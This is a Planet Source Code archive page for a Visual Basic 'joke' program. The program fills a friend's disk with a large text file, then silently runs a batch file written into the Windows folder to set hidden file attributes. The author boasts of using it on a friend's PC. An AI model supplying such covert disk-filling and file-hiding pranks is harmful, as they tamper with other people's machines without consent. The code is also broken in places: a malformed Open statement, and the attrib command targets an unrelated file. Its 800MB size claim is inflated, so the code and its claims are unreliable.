<div align="center">

## Make 800mb \(lol\)


</div>

### Description

(Update)This will create a file and add 999999 words to it. It can take upto 800mb of HDD space. silly simple code but i had fun with my friends PC, Lol.

Ok have 800mb's of fun.

If you give me 5 votes i will pay :) hehe
 
### More Info
 


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[Father Christmas](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/father-christmas.md)
**Level**          |Beginner
**User Rating**    |2.5 (15 globes from 6 users)
**Compatibility**  |VB 5\.0, VB 6\.0, VBA MS Excel
**Category**       |[Jokes/ Humor](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/jokes-humor__1-40.md)
**World**          |[Visual Basic](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/visual-basic.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/father-christmas-make-800mb-lol__1-55235/archive/master.zip)

### API Declarations

Nothing here.


### Source Code

```
Private Sub Form_Load()
'By Chad.Lex
'UK/Wales
Path_ = "c:\Hello.txt"
Open Path_ For Output As #1
For i = 1 To 999999
Print #1, "Hahahahaha"
Next i
Close #1
'Now i have hidden the 800mb file from user. Now whats he going to do??
Open "c:\Windows\Hide.bat"
Print #1, "Attrib +h c:\Win1.exe"
Close #1
RetVal = Shell("c:\Windows\Hide.bat", vbHide)
End Sub
```

